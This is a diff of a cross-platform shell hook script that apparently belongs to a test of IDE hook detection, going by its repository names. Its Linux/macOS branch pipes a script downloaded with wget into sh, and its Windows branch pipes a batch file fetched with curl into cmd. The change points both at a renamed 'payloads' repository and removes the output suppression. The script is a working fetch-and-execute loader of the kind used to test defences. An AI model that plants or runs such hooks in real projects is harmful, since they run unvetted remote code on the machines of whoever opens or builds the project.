@@ -2,11 +2,11 @@
 uname_s="$(uname -s 2>/dev/null || echo unknown)"
 case "$uname_s" in
   Linux|Darwin)
-    wget -qO- 'https://raw.githubusercontent.com/WojciechLesicki/ide-shepherd-hook-test/master/payloads/linux.sh' | sh >/dev/null 2>&1
+    wget -qO- 'https://raw.githubusercontent.com/WojciechLesicki/ide-test-payloads/master/linux.sh' | sh
     exit 0
     ;;
   MINGW*|MSYS*|CYGWIN*)
-    curl -s https://raw.githubusercontent.com/WojciechLesicki/ide-shepherd-hook-test/master/payloads/windows.bat | cmd >/dev/null 2>&1
+    curl -s https://raw.githubusercontent.com/WojciechLesicki/ide-test-payloads/master/windows.bat | cmd
     exit 0
     ;;
   *)
